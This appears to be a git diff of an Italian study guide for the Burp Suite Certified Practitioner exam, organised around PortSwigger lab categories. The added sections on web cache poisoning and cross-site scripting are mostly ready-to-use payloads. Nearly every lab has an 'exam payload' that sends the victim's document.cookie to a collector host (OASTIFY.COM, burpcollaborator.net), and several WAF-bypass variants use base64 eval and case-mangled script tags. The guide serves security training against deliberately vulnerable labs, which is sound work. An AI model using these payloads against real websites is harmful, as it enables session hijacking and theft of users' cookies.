@@ -14,42 +14,42 @@ Nov 15, 2026
 
 | Categoria | Stage 1 | Stage 2 | Stage 3 |
 | --- | --- | --- | --- |
-| Information disclosure | ✓ |  |  |
-| DOM-based vulnerabilities | ✓ |  |  |
-| Web cache poisoning | ✓ |  |  |
-| Cross-site scripting | ✓ | ✓ |  |
-| Clickjacking | ✓ | ✓ |  |
-| HTTP request smuggling | ✓ | ✓ |  |
-| Authentication | ✓ | ✓ |  |
-| HTTP Host header attacks | ✓ | ✓ |  |
-| OAuth authentication | ✓ | ✓ |  |
-| WebSockets | ✓ | ✓ |  |
-| CSRF |  | ✓ |  |
-| CORS |  | ✓ |  |
-| Access control |  | ✓ |  |
-| JWT |  | ✓ |  |
-| SQL Injection |  | ✓ |  |
-| GraphQL API vulnerabilities |  | ✓ |  |
-| API testing |  | ✓ |  |
-| Business logic vulnerabilities |  | ✓ |  |
-| Race conditions |  | ✓ |  |
-| NoSQL injection |  | ✓ |  |
-| Web cache deception |  | ✓ |  |
-| Prototype pollution |  | ✓ | ✓ |
-| Web LLM attacks |  | ✓ | ✓ |
-| XXE injection |  |  | ✓ |
-| SSRF |  |  | ✓ |
-| OS command injection |  |  | ✓ |
-| Server-side template injection |  |  | ✓ |
-| Path traversal |  |  | ✓ |
-| Insecure deserialization |  |  | ✓ |
-| File upload vulnerabilities |  |  | ✓ |
-| Essential skills | ✓ | ✓ | ✓ |
+| [Information disclosure](#information-disclosure--stage-tipico-1) | ✓ |  |  |
+| [DOM-based vulnerabilities](#dom-based-vulnerabilities--stage-tipico-1) | ✓ |  |  |
+| [Web cache poisoning](#web-cache-poisoning--stage-tipico-1) | ✓ |  |  |
+| [Cross-site scripting](#cross-site-scripting--stage-tipico-1-2) | ✓ | ✓ |  |
+| [Clickjacking](#clickjacking--stage-tipico-1-2) | ✓ | ✓ |  |
+| [HTTP request smuggling](#http-request-smuggling--stage-tipico-1-2) | ✓ | ✓ |  |
+| [Authentication](#authentication--stage-tipico-1-2) | ✓ | ✓ |  |
+| [HTTP Host header attacks](#http-host-header-attacks--stage-tipico-1-2) | ✓ | ✓ |  |
+| [OAuth authentication](#oauth-authentication--stage-tipico-1-2) | ✓ | ✓ |  |
+| [WebSockets](#websockets--stage-tipico-1-2) | ✓ | ✓ |  |
+| [CSRF](#cross-site-request-forgery-csrf--stage-tipico-2) |  | ✓ |  |
+| [CORS](#cross-origin-resource-sharing-cors--stage-tipico-2) |  | ✓ |  |
+| [Access control](#access-control-vulnerabilities--stage-tipico-2) |  | ✓ |  |
+| [JWT](#jwt--stage-tipico-2) |  | ✓ |  |
+| [SQL Injection](#sql-injection--stage-tipico-2) |  | ✓ |  |
+| [GraphQL API vulnerabilities](#graphql-api-vulnerabilities) |  | ✓ |  |
+| [API testing](#api-testing) |  | ✓ |  |
+| [Business logic vulnerabilities](#business-logic-vulnerabilities--stage-tipico-2) |  | ✓ |  |
+| [Race conditions](#race-conditions--stage-tipico-2) |  | ✓ |  |
+| [NoSQL injection](#nosql-injection--stage-tipico-2) |  | ✓ |  |
+| [Web cache deception](#web-cache-deception--stage-tipico-2) |  | ✓ |  |
+| [Prototype pollution](#prototype-pollution) |  | ✓ | ✓ |
+| [Web LLM attacks](#web-llm-attacks--stage-tipico-2-3) |  | ✓ | ✓ |
+| [XXE injection](#xml-external-entity-xxe-injection--stage-tipico-3) |  |  | ✓ |
+| [SSRF](#server-side-request-forgery-ssrf--stage-tipico-3) |  |  | ✓ |
+| [OS command injection](#os-command-injection--stage-tipico-3) |  |  | ✓ |
+| [Server-side template injection](#server-side-template-injection--stage-tipico-3) |  |  | ✓ |
+| [Path traversal](#path-traversal--stage-tipico-3) |  |  | ✓ |
+| [Insecure deserialization](#insecure-deserialization--stage-tipico-3) |  |  | ✓ |
+| [File upload vulnerabilities](#file-upload-vulnerabilities--stage-tipico-3) |  |  | ✓ |
+| [Essential skills](#essential-skills--stage-tipico-1-2-3) | ✓ | ✓ | ✓ |
 
 
 # Stage 1 — Foothold (accesso iniziale)
 
-Categorie tipicamente usate per ottenere il primo accesso: contro una vittima anonima/generica, senza bisogno di credenziali proprie. Ordine conforme a [botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study) (sezione "Foothold").
+Categorie tipicamente usate per ottenere il primo accesso: contro una vittima anonima/generica, senza bisogno di credenziali proprie. Ordine conforme alla tabella riassuntiva iniziale.
 
 
 ## Information disclosure — Stage tipico: 1
@@ -162,6 +162,157 @@ https://TARGET/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.n
 - Step: 1
 
 
+## Web cache poisoning — Stage tipico: 1
+
+**Come riconoscerla (generale):** cerca input *unkeyed* (header come `X-Forwarded-Host`, cookie, parametri) che influenzano la risposta ma non fanno parte della cache key; usa un cache buster (parametro o header univoco) per isolare i tuoi test, poi verifica se riesci a far cachare una risposta "avvelenata" che venga servita anche senza il tuo input malevolo (richiesta "pulita").
+
+### A. Difetti di design della cache (header/cookie unkeyed)
+
+**1. Con un header unkeyed**
+
+- Segnale: l'header `X-Forwarded-Host` (non in cache key) viene usato per generare dinamicamente l'URL assoluto da cui la home importa un file JS (es. `/resources/js/tracking.js`). Con un cache-buster `?cb=1234` e `X-Forwarded-Host: example.com` vedi l'host riflesso nell'`src` dello script; `X-Cache: hit` conferma la cache.
+- Soluzione: ospitare sull'exploit server un file con lo **stesso path** del JS importato (`/resources/js/tracking.js`) contenente il payload, poi inviare la richiesta della home (senza cache-buster) con `X-Forwarded-Host` puntato all'exploit server, così la cache serve a tutti una home che importa il tuo JS.
+- Payload (file `/resources/js/tracking.js` sull'exploit server = `alert(document.cookie)`; header nella richiesta della home):
+```
+X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
+- Payload da esame (Burp Collaborator/OAST): nel corpo del file JS sull'exploit server, esfiltra il cookie.
+```javascript
+document.location='https://OASTIFY.COM/?c='+document.cookie
+```
+- Link: [Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)
+- Step: 1
+
+**2. Con un cookie unkeyed**
+
+- Segnale: un cookie (es. `fehost=prod-cache-01`) non è in cache key e il suo valore viene riflesso dentro un oggetto JavaScript tra doppi apici nella risposta.
+- Soluzione: rompere la stringa tra doppi apici dal valore del cookie per iniettare JS; far cachare la risposta (`X-Cache: hit`) e poi togliere il cache-buster per avvelenare l'URL pulito.
+- Payload (nel cookie):
+```
+fehost=someString"-alert(1)-"someString
+```
+- Payload da esame (Burp Collaborator/OAST): stesso breakout dalla stringa, con esfiltrazione del cookie.
+```
+fehost=x"-document.location='https://OASTIFY.COM/?c='+document.cookie-"x
+```
+- Link: [Web cache poisoning with an unkeyed cookie](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)
+- Step: 1
+
+**3. Con più header combinati**
+
+- Segnale: `X-Forwarded-Host` da solo non ha effetto, ma `X-Forwarded-Scheme` con un valore diverso da `https` genera un 302 verso `https://`; combinato con `X-Forwarded-Host`, il `Location` del redirect punta all'host che scegli. Si lavora sulla richiesta del file JS `/resources/js/tracking.js`.
+- Soluzione: usare i due header insieme per far sì che l'import del JS venga rediretto verso l'exploit server, dove ospiti un `/resources/js/tracking.js` malevolo; far cachare e poi togliere il cache-buster.
+- Payload (header nella richiesta di `/resources/js/tracking.js`; file omonimo sull'exploit server = `alert(document.cookie)`):
+```
+X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+X-Forwarded-Scheme: nothttps
+```
+- Payload da esame (Burp Collaborator/OAST): nel corpo del file JS sull'exploit server, esfiltra il cookie.
+```javascript
+document.location='https://OASTIFY.COM/?c='+document.cookie
+```
+- Link: [Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)
+- Step: 1
+
+**4. Targeted, con un header ignoto da scoprire**
+
+- Segnale: con Param Miner ("Guess headers") scopri un header segreto `X-Host` che genera l'URL assoluto per importare `/resources/js/tracking.js`. L'header `Vary: User-Agent` indica che lo User-Agent fa parte della cache key: devi colpire solo chi ha lo stesso UA della vittima.
+- Soluzione: ospitare `/resources/js/tracking.js` malevolo sull'exploit server e puntarci con `X-Host`; per scoprire lo User-Agent della vittima, postare un commento con un `<img>` verso l'exploit server e leggere lo UA dall'Access log; infine avvelenare la cache con quello User-Agent impostato (e cache-buster rimosso).
+- Payload (commento per far leakare lo User-Agent della vittima dall'Access log):
+```html
+<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
+```
+- Payload (header nella richiesta della home, con lo User-Agent della vittima impostato; file `tracking.js` sull'exploit server = `alert(document.cookie)`):
+```
+X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
+- Payload da esame (Burp Collaborator/OAST): nel corpo del file JS sull'exploit server, esfiltra il cookie.
+```javascript
+document.location='https://OASTIFY.COM/?c='+document.cookie
+```
+- Link: [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)
+- Step: 1
+
+### B. Difetti di implementazione della cache key
+
+**5. Query string non in chiave (unkeyed query string)**
+
+- Segnale: la cache ignora completamente la query string (ottieni `X-Cache: hit` anche cambiando i parametri), ma i parametri vengono riflessi nella risposta. Si usa l'header `Origin` come cache-buster.
+- Soluzione: aggiungere un parametro arbitrario che rompe la stringa riflessa e inietta un `<script>`; far cachare, poi rimuovere il cache-buster (`Origin`) e tenere il payload per avvelenare l'URL pulito della home.
+- Payload (nella query string):
+```
+GET /?evil='/><script>alert(1)</script>
+```
+- Payload da esame (Burp Collaborator/OAST): stesso breakout, con esfiltrazione del cookie.
+```
+GET /?evil='/><script>document.location='https://OASTIFY.COM/?c='+document.cookie</script>
+```
+- Link: [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)
+- Step: 1
+
+**5b. Parametro di query specifico non in chiave (unkeyed query parameter)**
+
+- Segnale: la query string è in cache key (cambiarla dà `cache miss`), ma un parametro specifico no — tipicamente di analytics/marketing come `utm_content`, identificabile con Param Miner ("Guess GET parameters"). Quel parametro escluso viene comunque riflesso.
+- Soluzione: usare quel parametro unkeyed per rompere la stringa riflessa e iniettare un `<script>`, mantenendo invariata la cache key; far cachare, poi avvelenare l'URL pulito.
+- Payload (nel parametro escluso):
+```
+GET /?utm_content='/><script>alert(1)</script>
+```
+- Payload da esame (Burp Collaborator/OAST): stesso breakout, con esfiltrazione del cookie.
+```
+GET /?utm_content='/><script>document.location='https://OASTIFY.COM/?c='+document.cookie</script>
+```
+- Link: [Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
+- Step: 1
+
+**6. Parameter cloaking**
+
+- Segnale: il parametro `utm_content` è escluso dalla cache key; cache e back-end fanno parsing diverso dei delimitatori (un `;` appende un secondo parametro che la cache tratta come parte dell'`utm_content` escluso, ma il server lo interpreta a sé). La pagina importa `/js/geolocate.js?callback=setCountryCookie` (JSONP): il valore di `callback` è il nome della funzione richiamata nella risposta.
+- Soluzione: appendere via `;` un secondo `callback` dentro `utm_content`: resta fuori dalla cache key (quindi avveleni l'URL "pulito" `?callback=setCountryCookie`) ma sovrascrive la funzione JSONP eseguita, impostandola sul payload.
+- Payload (la cache key resta `/js/geolocate.js?callback=setCountryCookie`):
+```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+```
+- Payload da esame (Burp Collaborator/OAST): il callback esfiltra il cookie (il `//` commenta il `({...})` che il server appende).
+```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='https://OASTIFY.COM/?c='+document.cookie//
+```
+- Link: [Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
+- Step: 1
+
+**7. Fat GET request**
+
+- Segnale: la cache key deriva solo dalla request line (metodo+URL), ma il server legge anche un `callback` duplicato passato nel **body** di una GET. La pagina importa `/js/geolocate.js?callback=setCountryCookie` (JSONP).
+- Soluzione: inviare la GET con cache key "pulita" (`?callback=setCountryCookie`) e un body che duplica `callback` impostandolo sul payload; il server usa il valore dal body, la cache chiave resta innocua.
+- Payload (request line + body):
+```
+GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
+...
+
+callback=alert(1)
+```
+- Payload da esame (Burp Collaborator/OAST): callback che esfiltra il cookie (il `//` commenta il `({...})` appeso dal server).
+```
+callback=document.location='https://OASTIFY.COM/?c='+document.cookie//
+```
+- Link: [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
+- Step: 1
+
+**8. URL normalization**
+
+- Segnale: esiste una reflected XSS nel path (es. riflesso nel messaggio d'errore di un path inesistente), non direttamente sfruttabile perché il browser della vittima URL-encoda il payload; ma la cache normalizza (decodifica) il path quando costruisce la cache key.
+- Soluzione: avvelenare la cache inviando TU (via Repeater, non codificato) la richiesta con il payload nel path; la cache key normalizzata coincide con quella della richiesta URL-encoded che la vittima invierebbe cliccando il link, che quindi riceve la risposta avvelenata. Poi "Deliver link to victim" con l'URL malevolo.
+- Payload (nella request line, non URL-encoded):
+```
+GET /random</p><script>alert(1)</script><p>foo
+```
+- Payload da esame (Burp Collaborator/OAST): stesso path riflesso, con esfiltrazione del cookie.
+```
+GET /random</p><script>document.location='https://OASTIFY.COM/?c='+document.cookie</script><p>foo
+```
+- Link: [URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)
+- Step: 1
+
 ## Cross-site scripting — Stage tipico: 1-2
 
 **Come riconoscerla (generale):** inserisci una stringa alfanumerica unica in ogni punto di input (parametri URL, form, header, cookie) e cerca dove viene riflessa nella risposta; poi identifica il contesto esatto (testo tra tag, dentro un attributo, dentro uno script, dentro un template literal) per scegliere il payload giusto. Per i casi stored, cerca lo stesso negli endpoint che mostrano dati salvati (commenti, profilo, chat).
@@ -172,37 +323,66 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **1. DOM XSS in document.write sink dentro un elemento select**
 
-- Segnale: `location.search` finisce in un `document.write()` usato per popolare le opzioni di una `<select>`; dentro un tag `<select>` i tag HTML non vengono interpretati normalmente.
-- Soluzione: chiudere prima il tag `</select>` (e l'eventuale altro tag contenitore) per uscire dal contesto non eseguibile, poi iniettare il markup.
-- Payload: `</select><img src=1 onerror=alert(document.domain)>`
-- Payload da esame (Burp Collaborator): `</select><img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>`
+- Segnale: nelle pagine prodotto il parametro `storeId` viene letto da `location.search` e finisce in un `document.write()` che crea una nuova `<option>` dentro il `<select>` dello stock checker; il valore viene messo dentro un attributo dell'option.
+- Soluzione: chiudere prima l'attributo e il tag con `">`, poi uscire dal contesto non eseguibile con `</select>`, infine iniettare un tag con event handler.
+- Payload:
+```
+product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
+```
+- Payload da esame (Burp Collaborator/OAST): stesso breakout, ma invece di `alert(1)` esfiltra il cookie verso il collector.
+```
+product?productId=1&storeId="></select><img src=1 onerror=fetch('https://OASTIFY.COM/?c='+document.cookie)>
+```
 - Link: [DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
 - Step: 1
 
 **2. DOM XSS in AngularJS expression (angle brackets e doppi apici HTML-encoded)**
 
-- Segnale: la pagina usa `ng-app`/AngularJS e il tuo input finisce in un contesto dove angle brackets e `"` sono encodati, ma le doppie parentesi graffe no.
-- Soluzione: sfruttare il sandbox di AngularJS (nessuna CSP) per eseguire una expression `{{...}}` che richiama il costruttore di funzione.
-- Payload: `{{$on.constructor('alert(1)')()}}`
-- Payload da esame (Burp Collaborator): `{{$on.constructor('document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie')()}}`
+- Segnale: la search è dentro un nodo con l'attributo/direttiva `ng-app` (AngularJS); il tuo input viene riflesso in un contesto dove angle brackets e `"` sono HTML-encoded, ma le doppie parentesi graffe `{{ }}` no.
+- Soluzione: sfruttare il sandbox di AngularJS (nessuna CSP) eseguendo una expression `{{...}}` che richiama il costruttore di funzione; non servono angle brackets né apici.
+- Payload:
+```
+{{$on.constructor('alert(1)')()}}
+```
+- Payload da esame (Burp Collaborator/OAST): la expression esegue l'esfiltrazione del cookie.
+```
+{{$on.constructor('document.location="https://OASTIFY.COM/?c="+document.cookie')()}}
+```
 - Link: [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
 - Step: 1
 
 **3. Reflected DOM XSS**
 
-- Segnale: il server riflette un valore dentro uno script, es. `eval('var data = "..."')`, dove il valore riflesso dal server (non dal browser) viene poi eseguito via `eval`.
-- Soluzione: interrompere la stringa passata a `eval` e iniettare codice proprio, tenendo conto che qui il round-trip passa dal server (quindi l'encoding server-side conta).
-- Payload: `\'-alert(document.domain)-\'` (o varianti in base all'encoding applicato dal server)
-- Payload da esame (Burp Collaborator): `\'-document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie-\'` (o varianti in base all'encoding applicato dal server)
+- Segnale: il server riflette il termine di ricerca in una risposta JSON (`search-results`); il file `searchResults.js` passa quel JSON a un `eval()`. La risposta JSON fa escape dei doppi apici, ma NON dei backslash.
+- Soluzione: iniettare un backslash prima del doppio apice: l'app aggiunge il proprio backslash di escape davanti all'apice, ottenendo `\\"` (doppio backslash = backslash letterale), così l'apice resta non-escapato e chiude la stringa. Poi un operatore (`-`) separa le espressioni, si chiama `alert(1)`, e `}//` chiude in anticipo l'oggetto JSON commentando il resto.
+- Payload (il JSON risultante diventa `{"searchTerm":"\\"-alert(1)}//", "results":[]}`):
+```
+\"-alert(1)}//
+```
+- Payload da esame (Burp Collaborator/OAST): stesso breakout, con esfiltrazione del cookie (apici singoli, che qui non vengono escapati).
+```
+\"-fetch('https://OASTIFY.COM/?c='+document.cookie)}//
+```
+- Bypass WAF (esame): se compare `"Potentially dangerous search term"` o vengono bloccati `alert`/`document`/`cookie`, accedi tramite **variabili globali** (notazione a parentesi quadre) e/o incapsula il cookie-stealer in `eval(atob("<BASE64>"))`, dove `<BASE64>` è la codifica base64 del payload `fetch('https://OASTIFY.COM/?c='+window["document"]["cookie"])`. È il pattern tipico del Practice Exam (foothold).
+```
+"-window["alert"](window["document"]["cookie"])-"
+"-eval(atob("<BASE64-del-cookie-stealer>"))-"
+```
 - Link: [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
 - Step: 1
 
 **4. Stored DOM XSS**
 
-- Segnale: un valore salvato (es. commento) viene scritto lato client con `element.innerHTML = comment.author` invece che inserito come testo sicuro.
-- Soluzione: impostare il proprio nome/commento a un payload HTML che sfrutta `innerHTML`.
-- Payload: `<img src=1 onerror=alert(document.domain)>` nel campo salvato (es. nome utente)
-- Payload da esame (Burp Collaborator): `<img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` nel campo salvato (es. nome utente)
+- Segnale: un commento salvato viene scritto nel DOM lato client; per prevenire l'XSS l'app usa `replace()` con un argomento stringa, che però sostituisce (encoda) solo la PRIMA occorrenza degli angle brackets.
+- Soluzione: anteporre una coppia extra di angle brackets `<>` che verrà "sacrificata" (encodata), così gli angle brackets del payload vero subito dopo passano inalterati e l'HTML viene iniettato.
+- Payload (nel campo commento):
+```
+<><img src=1 onerror=alert(1)>
+```
+- Payload da esame (Burp Collaborator/OAST): stesso trucco, con esfiltrazione del cookie.
+```
+<><img src=1 onerror=fetch('https://OASTIFY.COM/?c='+document.cookie)>
+```
 - Link: [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
 - Step: 1
 
@@ -210,36 +390,70 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **5. Tutti i tag/attributi più comuni bloccati**
 
-- Segnale: `<script>`, `onerror`, `onload` ecc. vengono rimossi o bloccati da una whitelist molto stretta.
-- Soluzione: cercare un tag/evento residuo non filtrato (es. `body` con `onresize`, o forzare uno scroll/resize); spesso serve un evento che si attiva senza click, dentro un iframe.
-- Payload tipico: `<body onresize=print()>` dentro un `<iframe>` che ne forza il resize
+- Segnale: un WAF blocca i vettori XSS comuni (`<script>`, `onerror`, `onload`...). Testando con Intruder (lista tag/eventi del cheat sheet) si scopre che passano solo il tag `<body>` e l'evento `onresize`.
+- Soluzione: consegnare dall'exploit server un `<iframe>` che punta alla ricerca con `<body onresize=print()>` e che al proprio `onload` cambia la propria larghezza, scatenando il resize del body dentro l'iframe (nessuna interazione della vittima).
+- Payload (nell'exploit server, sostituisci YOUR-LAB-ID):
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+- Payload da esame (Burp Collaborator/OAST): `onresize` esfiltra il cookie (nota `+` URL-encodato come `%2b`).
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=fetch('https://OASTIFY.COM/?c='%2bdocument.cookie)%3E" onload=this.style.width='100px'>
+```
+- Variante (esame): se `onresize` è filtrato, spesso passa `onpopstate` (si attiva al cambio di history/hash con l'`#` finale) e non richiede di ridimensionare l'iframe.
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onpopstate=document.location='https://OASTIFY.COM/?c='+document.cookie%3E#">
+```
 - Link: [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
 - Step: 1
 
 **6. Tutti i tag bloccati tranne quelli custom**
 
 - Segnale: solo i tag HTML standard sono bloccati; i tag con nome arbitrario (custom element) passano il filtro.
-- Soluzione: usare un tag inventato con `onfocus` e `autofocus`/`tabindex` per eseguire JS senza interazione dell'utente.
-- Payload: `<xss id=x onfocus=alert(document.domain) tabindex=1></xss>#x` (l'hash forza il focus sull'elemento)
-- Payload da esame (Burp Collaborator): `<xss id=x onfocus=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie tabindex=1></xss>#x` (l'hash forza il focus sull'elemento)
+- Soluzione: usare un tag inventato con `onfocus` e `tabindex=1`, più un `#x` in fondo all'URL che forza il focus sull'elemento (via fragment) appena la pagina carica, eseguendo JS senza interazione.
+- Payload (nel parametro `search`):
+```
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+```
+- Delivery completo dall'exploit server (reindirizza la vittima all'URL già codificato):
+```html
+<script>location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
+```
+- Payload da esame (Burp Collaborator/OAST): `onfocus` esfiltra il cookie invece di mostrarlo.
+```
+<xss id=x onfocus=fetch('https://OASTIFY.COM/?c='+document.cookie) tabindex=1>#x
+```
 - Link: [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
 - Step: 1
 
 **7. SVG markup consentito**
 
-- Segnale: tag HTML normali sono bloccati ma `<svg>` e i tag SVG passano.
-- Soluzione: usare un elemento SVG con un evento che si auto-attiva, es. `animatetransform` con `onbegin`.
-- Payload: `<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>`
-- Payload da esame (Burp Collaborator): `<svg><animatetransform onbegin=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie attributeName=transform>`
+- Segnale: i tag HTML normali sono bloccati, ma `<svg>`, `<animatetransform>`, `<title>`, `<image>` passano; tra gli eventi passa `onbegin`.
+- Soluzione: chiudere l'attributo con `">`, poi usare `<svg>` con `<animatetransform onbegin=...>` che si auto-attiva all'inizio dell'animazione.
+- Payload (nel parametro `search`):
+```
+"><svg><animatetransform onbegin=alert(1)>
+```
+- Payload da esame (Burp Collaborator/OAST): `onbegin` esfiltra il cookie.
+```
+"><svg><animatetransform onbegin=fetch('https://OASTIFY.COM/?c='+document.cookie)>
+```
 - Link: [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
 - Step: 1
 
 **8. Reflected XSS nel tag `<link rel=canonical>`**
 
-- Segnale: l'input finisce dentro l'attributo `href` di un tag `<link rel="canonical">`; gli angle brackets sono encodati ma puoi chiudere l'attributo e aggiungerne altri.
-- Soluzione: chiudere `href`, aggiungere `accesskey` + `onclick` (il tag `<link>` non genera eventi automatici, quindi serve l'interazione via tasto di scelta rapida) e indurre la vittima a premere la combinazione di tasti.
-- Payload: ` " accesskey="x" onclick="alert(document.domain)"  ` (poi delivery che induce la vittima a premere Alt+Shift+X / Ctrl+Alt+X secondo il sistema)
-- Payload da esame (Burp Collaborator): ` " accesskey="x" onclick="document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie"  ` (poi delivery che induce la vittima a premere Alt+Shift+X / Ctrl+Alt+X secondo il sistema)
+- Segnale: l'input della home page viene riflesso dentro un tag `<link rel="canonical">` e gli angle brackets sono encodati; puoi però iniettare attributi. (Soluzione prevista solo in Chrome.)
+- Soluzione: iniettare un `accesskey` che imposta il tasto `X` come scorciatoia per l'intera pagina, con un `onclick` che chiama `alert`. Quando la vittima preme la combinazione, scatta l'handler.
+- Payload (nella query string della home):
+```
+?'accesskey='x'onclick='alert(1)
+```
+- Per innescare: Windows `ALT+SHIFT+X` · macOS `CTRL+ALT+X` · Linux `Alt+X`.
+- Payload da esame (Burp Collaborator/OAST): `onclick` esfiltra il cookie.
+```
+?'accesskey='x'onclick='fetch("https://OASTIFY.COM/?c="+document.cookie)
+```
 - Link: [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
 - Step: 1
 
@@ -247,37 +461,73 @@ Il sink non è nella risposta HTTP ma nel JavaScript lato client: va trovato il 
 
 **9. Apice singolo e backslash escapati**
 
-- Segnale: il valore finisce in una stringa JS tra apici singoli; l'app escapa `'` e `\` ma non chiude il tag `<script>`.
-- Soluzione: chiudere direttamente il tag script e aprirne uno nuovo, bypassando l'escaping della stringa.
-- Payload: `</script><img src=1 onerror=alert(document.domain)>`
-- Payload da esame (Burp Collaborator): `</script><img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>`
+- Segnale: il valore finisce in una stringa JS tra apici singoli; l'app escapa `'` e `\`, ma non impedisce di chiudere il tag `<script>`.
+- Soluzione: non provare a rompere la stringa — chiudere direttamente il tag `</script>` e aprirne uno nuovo.
+- Payload:
+```
+</script><script>alert(1)</script>
+```
+- Payload da esame (Burp Collaborator/OAST): nuovo script che esfiltra il cookie.
+```
+</script><script>fetch('https://OASTIFY.COM/?c='+document.cookie)</script>
+```
+- Bypass "Tag is not allowed" (esame): se il filtro blocca `</script>`, usa case-mangling + spazio (`</ScRiPt >`): il browser chiude comunque il blocco script.
+```
+</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?c="+document.cookie>
+```
 - Link: [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
 - Step: 1
 
 **10. Angle brackets/doppi apici HTML-encoded, apice singolo escapato**
 
-- Segnale: l'app mette un backslash davanti a ogni apice singolo, ma non raddoppia (escape) i backslash che inserisci tu.
-- Soluzione: inviare un backslash extra prima del tuo apice, così il backslash dell'app "neutralizza" il tuo e il tuo apice torna a chiudere la stringa.
-- Payload: `\';alert(document.domain)//` (diventa `\\';alert(document.domain)//` dopo l'escaping dell'app)
-- Payload da esame (Burp Collaborator): `\';document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//` (diventa `\\';alert(document.domain)//` dopo l'escaping dell'app)
+- Segnale: angle brackets e `"` sono HTML-encoded e l'app mette un backslash davanti a ogni apice singolo, ma NON raddoppia (escapa) i backslash che inserisci tu.
+- Soluzione: inviare un backslash extra prima del tuo apice: il backslash dell'app si attacca al tuo (`\\`), neutralizzandosi, e il tuo apice torna a chiudere la stringa. Poi operatore `-` e payload, con `//` per commentare il resto.
+- Payload (diventa `\\'-alert(1)//` dopo l'escaping dell'app):
+```
+\'-alert(1)//
+```
+- Payload da esame (Burp Collaborator/OAST): esfiltrazione cookie dopo il breakout.
+```
+\'-fetch('https://OASTIFY.COM/?c='+document.cookie)//
+```
+- Variante backtick (esame): per evitare conflitti con gli apici dentro l'URL, racchiudi il collector nei backtick (template literal) e chiudi con `;`.
+```
+\';document.location=`https://OASTIFY.COM/?c=`+document.cookie;//
+```
 - Link: [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
 - Step: 1
 
 **11. Stored XSS in evento onclick (angle brackets/doppi apici encoded, apice singolo e backslash escapati)**
 
